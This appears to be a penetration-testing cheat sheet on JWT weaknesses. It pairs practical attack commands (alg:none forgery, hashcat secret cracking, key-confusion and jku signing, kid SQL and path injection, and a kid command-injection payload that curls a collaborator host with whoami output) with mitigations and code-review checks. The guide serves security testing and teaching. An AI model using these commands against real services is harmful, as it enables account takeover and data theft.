---
title: JWT
---

# JWT

## **Introduction to JSON Web Tokens (JWT)**

**JSON Web Token (JWT)** is a compact, URL-safe token format used to securely transmit claims between a client and a server for authentication and authorization. A JWT consists of three Base64URL-encoded parts—the **Header**, **Payload**, and **Signature**—separated by dots (`.`). After successful authentication, the server issues a signed JWT, which the client includes in subsequent requests (typically in the `Authorization: Bearer` header). The server verifies the token's signature to ensure its integrity and authenticity before granting access to protected resources.

In real assessments, testers usually find JWTs in:

- `Authorization: Bearer <token>` headers
- Session cookies (`access_token`, `id_token`, `jwt`)
- SSO/OAuth redirect flows
- Mobile API traffic and GraphQL endpoints

A JWT (usually JWS) has 3 parts:

`HEADER.PAYLOAD.SIGNATURE`

- **HEADER**: algorithm/key metadata (`alg`, `kid`, `jku`, etc.)
- **PAYLOAD**: claims (`sub`, `role`, `iss`, `aud`, `exp`, ...)
- **SIGNATURE**: proof that token was signed by trusted key

---

### **JWT Structure & Algorithms**

#### **JWT Format (JWS Compact Serialization)**

`eyJhbGciOiJSUzI1NiIsImtpZCI6ImtleS0xIn0.eyJzdWIiOiIxMjM0Iiwicm9sZSI6InVzZXIiLCJpYXQiOjE3MDAwMDAwMDB9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

Header  (alg, kid, jku...)
Payload (sub, role, exp...)
Signature`

#### **Supported Algorithms (JWA)**

| **Algorithm Type** | **Algorithms** | **Key Pentest Pointers**  |
| --- | --- | --- |
| **Symmetric (HMAC)** | `HS256`, `HS384`, `HS512` | Most brute-force findings happen here (weak secret) |
| **Asymmetric (RSA)** | `RS256`, `RS384`, `RS512` | Common target for RS→HS confusion checks |
| **Asymmetric (ECDSA)** | `ES256`, `ES384`, `ES512` | Validate library/JDK patch level |
| **RSASSA-PSS** | `PS256`, `PS384`, `PS512` | Good modern option if implemented correctly |
| **None** | `none` | Must be rejected — test it anyway |

---

### **JWT Claims**

#### **1. Registered Claim Names (Standard Claims)**

| **Claim** | **Type** | **What Testers Check** |
| --- | --- | --- |
| `iss` | String/URI | Is issuer strictly validated? |
| `sub` | String/URI | Can user identity be tampered? |
| `aud` | String/URI or Array | Token confusion across services |
| `exp` | NumericDate | Long-lived tokens / ignored expiry |
| `nbf` | NumericDate | Premature acceptance |
| `iat` | NumericDate | Clock-skew abuse / replay windows |
| `jti` | String | Reuse after logout / no revocation |

#### **2. Public Claim Names**

- Shared ecosystem claims (`email`, `scope`, etc.)
- Must avoid collisions and trust assumptions

#### **3. Private Claim Names**

- App-specific claims (`tenant_id`, `is_admin`, `internal_role`)

- High-risk when authorization trusts only claim values

---

### **JOSE Header Parameters**

#### **Common JWS/JWE Header Parameters**

| **Parameter** | **Type** | **Abuse Seen in Reports** |
| --- | --- | --- |
| `alg` | String/URI | Forced to `none` / swapped for confusion |
| `typ` | String | Usually low impact alone |
| `cty` | String | Nested token parsing confusion |
| `kid` | String | SQLi, path traversal, command injection |
| `jku` | URI | Key injection / SSRF |
| `jwk` | JWK | Embedded attacker key trust |
| `x5u` | URI | SSRF / malicious cert chain |
| `x5c` | Array | Unsafe cert trust path |
| `x5t` / `x5t#S256` | String | Thumbprint trust bypass checks |
| `crit` | Array | Incorrect critical extension handling |

---

## **Common JWT Vulnerabilities & Attacks**

### **1. Signature Not Verified (`decode()` misuse)**

- **Pattern**: API parses token payload and never validates signature.
- **Exploit**: Change `role=user` to `role=admin`, resend.
- **Impact**: Auth bypass / privilege escalation.
- **Mitigation**: Always perform strict signature verification before claim use.

**Practical commands:**

`# Decode without verifying (what the vulnerable server does internally)
python3 jwt_tool.py <JWT> -M at

# Tamper role claim and resend — no re-signing needed if server skips verification
python3 jwt_tool.py <JWT> -T -pc role -pv admin`

**HackerOne #2472798 (Newspack plugin):** Signature validation was skipped completely on registration/login endpoints — not just alg:none, full omission. Test **every** endpoint, not just the main login flow.

---

### **2. `alg: none` Acceptance**

- **Pattern**: Legacy library or custom parser accepts unsigned token.
- **Exploit**: Remove signature, set `alg` to `none`.
- **Impact**: Full account takeover.
- **Mitigation**: Hard deny `none`; enforce fixed allowlist server-side.

**Practical commands:**

`# Method 1: jwt_tool (easiest)
python3 jwt_tool.py <JWT> -X a

# Method 2: Manual build
header=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '+/' '-_')
payload=$(echo -n '{"sub":"admin","role":"admin"}' | base64 | tr -d '=' | tr '+/' '-_')
echo "${header}.${payload}."
# Note the trailing dot — empty signature

# Also try case variants — weak denylists are case-sensitive:
# "nOnE", "None", "NONE"`

**What to modify in the payload:**

- `"role": "admin"` or `"is_admin": true` → privilege escalation
- Change `"sub"` to another user's ID → account takeover
- Remove `"exp"` entirely → token never expires

---

### **3. Weak HMAC Secret**

- **Pattern**: Default/shared secrets (`secret`, env leak, repo leak).
- **Exploit**: Crack with `hashcat -m 16500`, re-sign elevated claims.
- **Impact**: Token forgery at scale.
- **Mitigation**: 256-bit random secrets, KMS storage, rotation.

**Practical commands:**

`# Export the JWT to a file
echo -n 'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyIn0.abc123' > jwt.txt

# Dictionary attack (fastest)
hashcat -a 0 -m 16500 jwt.txt /opt/seclists/Passwords/scraped-JWT-secrets.txt

# Rule-based (catches variations like Secret1!)
hashcat -a 0 -m 16500 jwt.txt rockyou.txt -r rules/best64.rule

# Brute-force short secrets
hashcat -a 3 -m 16500 jwt.txt ?a?a?a?a?a?a -i --increment-min=4

# Once cracked — re-sign with jwt_tool
python3 jwt_tool.py <JWT> -T -S hs256 -p 'cracked_secret'`

**Wordlists :**

1. `scraped-JWT-secrets.txt` (SecLists) — JWT-specific
2. github.com/wallarm/jwt-secrets — 340 known weak JWT secrets
3. `rockyou.txt` — classic fallback

**Where weak secrets come from — check all of these:**

- GitHub dork: `JWT_SECRET site:github.com` or `"jwt_secret" .env`
- Hardcoded in mobile app binaries — reverse with jadx/apktool
- Default framework values: Express uses `'secret'` in many tutorials
- Env variable leaks in debug responses or error messages

---

### **4. RSA/ECDSA → HMAC Algorithm Confusion**

- **Pattern**: Backend trusts token `alg`; uses public key as HMAC secret.
- **Exploit**: Switch `RS256/ES256` to `HS256`, sign using known public key.
- **Impact**: Auth bypass.
- **Mitigation**: Bind algorithm and key type in server config, not token input.

**Practical commands:**

`# Step 1: Get the server's public key
curl https://target.com/.well-known/jwks.json

# OR extract from TLS cert
openssl s_client -connect target.com:443 2>/dev/null \
  | sed -n '/BEGIN/,/END/p' > chain.pem
openssl x509 -pubkey -in chain.pem -noout > pubkey.pem

# Step 2: If no JWKS exposed, recover public key from 2 JWTs
docker run --rm -it portswigger/sig2n <token1> <token2>
# Outputs 4 candidate keys — try all 4

# Step 3: Burp JWT Editor
# → Import RSA public key → Attack → HMAC Key Confusion Attack

# Step 4: jwt_tool
python3 jwt_tool.py <JWT> -X k -pk pubkey.pem`

---

### **5. `kid` Injection**

- **Pattern**: `kid` concatenated into SQL/file path/shell command.
- **Exploit ideas**: Path traversal, SQLi, command injection.
- **Impact**: Bypass + possible RCE/SSRF/data access.
- **Mitigation**: Opaque key IDs, strict regex, parameterized lookups.

**Path traversal via kid:**

`# Goal: point kid to /dev/null → HMAC secret = empty string`

`# Modified header: {"alg":"HS256","typ":"JWT","kid":"../../../../../../dev/null"}

python3 jwt_tool.py <JWT> -I -hc kid -hv '../../../../../../dev/null' -S hs256 -p ''

# Other targets:
# /proc/sys/kernel/randomize_va_space
# /etc/hostname (if you know it)`

**SQL injection via kid:**

`# Query pattern: SELECT key FROM keys WHERE id = '<kid>'
# Inject: {"kid":"x' UNION SELECT 'attacker_key'--"}
# Then sign JWT with 'attacker_key' as the HS256 secret

# Fuzz kid with jwt_tool
python3 jwt_tool.py -t https://target.com/api -rc 'jwt=<TOKEN>' \
  -I -hc kid -hv payloads.txt`

**Command injection via kid:**

`{"kid":"/dev/null; curl https://your.burpcollaborator.net/$(whoami)"}`

Blind — check Burp Collaborator for DNS/HTTP pings.

---

### **6. `jku` / `x5u` Remote Key Fetch Abuse**

- **Pattern**: Verifier fetches keys from attacker URL.
- **Exploit**: Host malicious JWKS and sign with matching private key.
- **Impact**: Forged tokens, SSRF.
- **Mitigation**: Disable dynamic fetch or enforce hard allowlist + TLS pinning.

**Practical commands:**

`# Step 1: Generate your own RSA key pair
openssl genrsa -out attacker_private.pem 2048
openssl rsa -in attacker_private.pem -pubout -out attacker_public.pem

# Step 2: Build jwks.json and host it
# {"keys":[{"kty":"RSA","use":"sig","kid":"attacker-key-1","n":"<modulus>","e":"AQAB"}]}
python3 -m http.server 8080

# Step 3: Modified JWT header
# {"alg":"RS256","jku":"https://your-server.com/jwks.json","kid":"attacker-key-1"}

# Step 4: Sign with jwt_tool
python3 jwt_tool.py <JWT> -X s -ju 'https://your-server.com/jwks.json'

# Burp shortcut:
# JWT Editor → Attack → Embedded JWK (hosts JWKS automatically)

### Embedded `jwk` Trust (CVE-2018-0114 class)**
**Practical steps:**
```
1. Burp JWT Editor → Keys tab → Generate new RSA key
2. Repeater → JWT tab → Attack → Embedded JWK
3. Modify payload claims (role, sub, etc.)
4. Send — check if server accepts it`

---

### **8. Replay / Token Reuse**

- **Pattern**: Old tokens still valid after logout/password reset.
- **Exploit**: Reuse stolen access token.
- **Impact**: Persistent session hijack.
- **Mitigation**: Short `exp`, refresh rotation, `jti` denylist, event-based revocation.

**How to test:**

`# Step 1: Log in, copy your JWT
# Step 2: Log out through the UI
# Step 3: Replay the old token
curl -H 'Authorization: Bearer <OLD_JWT>' https://target.com/api/profile

# Also test after: password reset, email change, role change, account deletion`

---

### **9. Sensitive Data Exposure in Payload**

- **Pattern**: PII/API keys/internal flags inside JWT body.
- **Exploit**: Read token client-side or from logs/proxies.
- **Impact**: Data leakage/compliance violations.
- **Mitigation**: Minimize claims; use JWE only when confidentiality required.

**Quick check:**

`# Decode payload without any tools
echo 'eyJzdWIiOiIxMjM0Iiwicm9sZSI6ImFkbWluIn0' | base64 -d 2>/dev/null
# Look for: email, phone, SSN, API keys, is_admin, internal_role, tenant_id`

---

### **10. SSO Redirect Leaks**

- **Pattern**: Open redirect in auth callback leaks JWT to attacker domain.
- **Exploit**: Craft malicious redirect URI.
- **Impact**: Token theft and account compromise.
- **Mitigation**: Strict redirect URI allowlist + exact match validation.

---

## **Attack Surfaces & Real-World Scenarios**

### **1. Microservice Token Confusion**

- One token valid across user/admin/internal APIs due to weak `aud`/`iss` checks.
- Test: replay a user-service token against `/admin-service/api/...`

### **2. SPA Token Storage**

- JWT in `localStorage` stolen via XSS, then replayed against APIs.
- Test: check where token is stored — localStorage = escalate XSS to full account takeover

### **3. Mobile/API Key Exposure**

- Hardcoded HMAC secret in app binary enables offline token forging.
- Test: reverse APK with jadx/apktool, grep for `secret`, `key`, `jwt`

### **4. CI/CD and Logs Leakage**

- JWTs exposed in debug logs, crash reports, or telemetry exports.
- Test: check `/debug`, `/logs`, error responses, Sentry-style dashboards

### **5. Multi-Tenant Authorization Bypass**

- `tenant_id` claim modified and accepted without server-side ownership checks.
- Test: decode JWT, change `tenant_id` to another org's ID, re-sign if HS256, replay

---

## **Bypassing Defenses: Encoding & Obfuscation**

| **Technique** | **Example** | **JWT Testing Goal** |
| --- | --- | --- |
| `alg` case tricks | `nOnE`, `None` | Weak denylist bypass |
| Missing signature | `header.payload.` | Verify strict parser behavior |
| Duplicated claims | `{"role":"user","role":"admin"}` | Parser ambiguity checks |
| JSON whitespace/order tricks | altered header formatting | Signature/normalization edge cases |
| Unicode/escaped values | `"r\u006Fle":"admin"` | Input validation bypass testing |
| Header parameter smuggling | add `jwk` + `jku` together | Confused key selection logic |

---

## **Framework-Specific Vulnerabilities**

### **1. Node.js (`jsonwebtoken`)**

- **Common issue:** `jwt.decode()` trusted for auth logic.
- **Fix:** `jwt.verify(token, key, { algorithms: [...] })` and strict claim validation.

`// Misconfigured : skips signature verification entirely
const payload = jwt.decode(token);

// Misconfigured : no algorithm pinned, trusts token's alg
jwt.verify(token, publicKey);

// CORRECT
jwt.verify(token, publicKey, { algorithms: ['RS256'] });`

### **2. Python (`PyJWT`)**

- **Common issue:** insecure decode flags / weak key handling.
- **Fix:** explicit algorithms, verify issuer/audience, pin keys.

`# Misconfigured : algorithms not specified
jwt.decode(token, key)

# Misconfigured : verification disabled
jwt.decode(token, options={'verify_signature': False})

# CORRECT
jwt.decode(token, key, algorithms=['RS256'], audience='my-service')`

### **3. Java (`jjwt`, Nimbus, JDK stack)**

- **Common issue:** outdated crypto runtime (e.g., ECDSA verification bugs in older Java).
- **Fix:** patch JDK/libs, strict key selection, disable dangerous JOSE headers.

`// Misconfigured : no signature verification
Jwts.parser().parseClaimsJwt(token);

// Misconfigured : trusting attacker-controlled alg header
String alg = header.getAlgorithm();

// CORRECT
Jwts.parserBuilder()
    .setSigningKey(key)
    .requireAudience("api")
    .build()
    .parseClaimsJws(token);`

### **4. .NET (`System.IdentityModel.Tokens.Jwt`)**

- **Common issue:** lax `TokenValidationParameters`.
- **Fix:** require signing key, issuer, audience, lifetime, and clock skew control.

`// Misconfigured : validation disabled
tokenHandler.ValidateToken(token, new TokenValidationParameters {
    ValidateSignature = false
}, out _);

// CORRECT
tokenHandler.ValidateToken(token, new TokenValidationParameters {
    ValidateIssuerSigningKey = true,
    IssuerSigningKey = signingKey,
    ValidateIssuer = true,
    ValidIssuer = "https://your-issuer.com",
    ValidateAudience = true,
    ValidAudience = "your-api",
    ValidateLifetime = true
}, out _);`

---

## **Security Issues (JWS)**

- Accepting `none` or malformed algorithm values
- Signature omitted but token still accepted
- Weak/shared HMAC secrets
- Algorithm/key confusion (RS/ES → HS)
- Dangerous dynamic key resolution (`kid`, `jku`, `jwk`, `x5u`)
- Missing claim validation (`iss`, `aud`, `exp`, `nbf`, `jti`)
- Non-constant-time comparisons in custom validators

---

## **Security Issues (JWE)**

- Unsafe encryption choices or legacy modes
- Decrypting JWE but skipping nested JWS verification
- Key management mistakes (wrong key use, weak rotation)
- Vulnerable library versions (padding oracle style issues)

---

## **Security Issues**

- `kid` used in DB/file/system command without sanitization
- `jku`/`x5u` remote fetch without allowlist or network controls
- Trusting token-provided keys over server trust store
- Cross-JWT substitution between services/apps
- Replay due to long validity and no revocation model

---

## **Detection Techniques**

### **Manual Testing Workflow**

1. Capture token from authenticated request.
2. Decode and map auth-critical claims (`role`, `scope`, `tenant`, `aud`).
3. Try signature bypasses (`none`, missing signature, alg switch).
4. Probe header injections (`kid`, `jku`, `jwk`, `x5u`).
5. Test replay after logout/password reset/role change.
6. Test cross-service token reuse and audience confusion.

### **Automated  Testing**

- Burp JWT Editor / Repeater macros
- `jwt_tool` for alg confusion, key tests, and tampering
- `hashcat` mode 16500 for HMAC secret strength checks
- Custom scripts for replay timing and revocation validation

### **Code Review Targets**

`# Find decode-only calls
grep -rn 'jwt.decode\|parseClaimsJwt\|verify_signature.*False' \
  --include='*.js' --include='*.py' .

# Find kid concatenation into queries/paths
grep -rn 'kid' . | grep -E '\+.*kid|kid.*\+|f".*kid|format.*kid'

# Find algorithm not pinned
grep -rn 'jwt.verify' . | grep -v 'algorithms'

# Semgrep scan
semgrep --config 'p/jwt' .`

---

## **Impact of JWT Attacks**

- A forged admin token via algorithm confusion or `alg:none` bypass gives full unauthorized access to any account or admin panel — no credentials needed.
- Weak HMAC secrets cracked offline let attackers mint unlimited valid tokens for any user, at any privilege level, without touching the server.
- `kid` injection into SQL or file paths turns an auth bypass into SQLi, LFI, or RCE — the JWT is just the entry point.
- `jku`/`jwk` header abuse chains into SSRF, letting attackers probe internal cloud metadata services or internal APIs.
- Tokens that survive logout or password reset give an attacker persistent access even after the victim has taken defensive action.
- Sensitive PII or internal flags in the payload are readable by anyone who intercepts the token — base64 is not encryption.
- JWTs passed as URL parameters leak into server logs, browser history, and `Referer` headers — silent, long-lasting exposure.
- Cross-service audience confusion lets a low-privilege token issued for one service authenticate against a higher-privilege service in the same infrastructure.

---

## **Prevention Techniques**

- Always verify the signature first, then validate claims, then authorize — never the other way around. Use `verify()`, never `decode()`.
- Pin the allowed algorithm in server config, not in the token itself — `{ algorithms: ['RS256'] }`. Never trust the `alg` field from the token.
- Use minimum 256-bit random secrets for HS256. Store all keys in KMS or HSM — never in `.env` files committed to repos.
- Treat `kid`, `jku`, `jwk`, and `x5u` as untrusted attacker-controlled input. Never concatenate `kid` into SQL queries or file paths.
- If remote JWKS fetch is needed, enforce a hard server-side allowlist of permitted URLs — disable it entirely if not required.
- Enforce `iss`, `aud`, `exp`, and `nbf` on every token. Use `jti` with a server-side denylist wherever replay after logout matters.
- Keep access tokens short-lived (15 minutes) with rotating refresh tokens. Revoke on logout, password reset, and risk events.
- Store JWTs in `HttpOnly`, `Secure`, `SameSite=Strict` cookies — never in `localStorage`. Never pass JWTs as URL parameters.

---

## **Tools for JWT Security Testing**

| **Tool** | **Practical Use** |
| --- | --- |
| [jwt.io](https://jwt.io/) | Quick decode/debug (not a trust oracle) |
| Burp Suite JWT Editor | Header/payload tampering and resigning tests |
| [jwt_tool](https://github.com/ticarpi/jwt_tool) | Automated JWT attack checks |
| [hashcat](https://hashcat.net/hashcat/) | HMAC secret brute-force strength assessment |
| CyberChef | Base64url transforms and payload crafting |
| OWASP ZAP scripts | Automated API JWT misuse checks |
| portswigger/sig2n | Recover RSA public key from 2 JWTs |

### **jwt_tool :**

`# Run ALL tests at once (green = vulnerable)
python3 jwt_tool.py <JWT> -M at

# alg:none
python3 jwt_tool.py <JWT> -X a

# Algorithm confusion (RS256→HS256)
python3 jwt_tool.py <JWT> -X k -pk pubkey.pem

# jku injection
python3 jwt_tool.py <JWT> -X s -ju 'https://your-server.com/jwks.json'

# Modify a claim
python3 jwt_tool.py <JWT> -T -pc role -pv admin

# Fuzz kid header
python3 jwt_tool.py <JWT> -I -hc kid -hv payloads.txt

# Crack HMAC secret
python3 jwt_tool.py <JWT> -C -d /opt/seclists/Passwords/scraped-JWT-secrets.txt`

---

## **Good to read & CVEs**

| **CVE** | **Affected** | **What Happened** | **Impact** |
| --- | --- | --- | --- |
| CVE-2018-0114 | cisco-node-jose, jose2go, Nimbus | Trusted embedded `jwk` in token header | Auth bypass |
| CVE-2022-21449 | Java 15–18 (ECDSA) | Blank ECDSA signature accepted ("psychic paper") | Auth bypass |
| CVE-2022-29217 | PyJWT <2.4.0 | ECDSA key accepted as HMAC secret | Alg confusion |
| CVE-2024-54150 | cjwt library | `alg` from header trusted → RS→HS confusion | Auth bypass |
| HackerOne #1889161 | Argo CD | `aud` not validated → any OIDC token accepted | Auth bypass |
| HackerOne #2472798 | Newspack plugin | Signature verification omitted on registration | Account takeover |

## **References :**

- [OWASP JWT Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_Cheat_Sheet.html)
- [PortSwigger JWT Attacks](https://portswigger.net/web-security/jwt)
- [OWASP WSTG JWT Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens)
- https://hacktricks.wiki/en/pentesting-web/hacking-jwt-json-web-tokens.html
- https://infosecwriteups.com/jwt-pentesting-a-journey-from-token-to-takeover-1b2a7af08933
- https://www.vaadata.com/en/blog/jwt-json-web-token-vulnerabilities-common-attacks-and-security-best-practices/
- [RFC 7519 - JWT](https://www.rfc-editor.org/rfc/rfc7519)
- [RFC 7515 - JWS](https://www.rfc-editor.org/rfc/rfc7515)
- [RFC 7516 - JWE](https://www.rfc-editor.org/rfc/rfc7516)